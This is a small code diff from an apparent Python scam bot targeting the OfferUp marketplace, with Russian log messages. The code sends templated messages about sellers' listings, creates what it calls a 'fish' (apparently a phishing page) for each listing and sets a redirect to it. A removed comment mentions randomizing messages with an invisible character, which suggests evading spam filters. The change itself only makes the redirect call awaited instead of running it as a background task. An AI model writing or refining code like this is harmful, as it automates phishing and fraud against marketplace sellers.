@@ -208,7 +208,6 @@ class OfferUpAccount:
                         random=generate_random_string(length=5)
                     )
                 else:
-                    # Рандомизируем невидимым символом
                     msg_text = msg_text.format(
                         title=ad["title"],
                         price=ad["price"],
@@ -248,7 +247,7 @@ class OfferUpAccount:
 
             if fish_redirect:
                 if fish := await create_fish(ad):
-                    asyncio.create_task(set_redirect(fish, fish_redirect.split("/")[-1], delay=0))
+                    await set_redirect(fish, fish_redirect.split("/")[-1], delay=0)
             logger.debug(f"Объявление {ad_id} успешно обработано!")
             return True
 
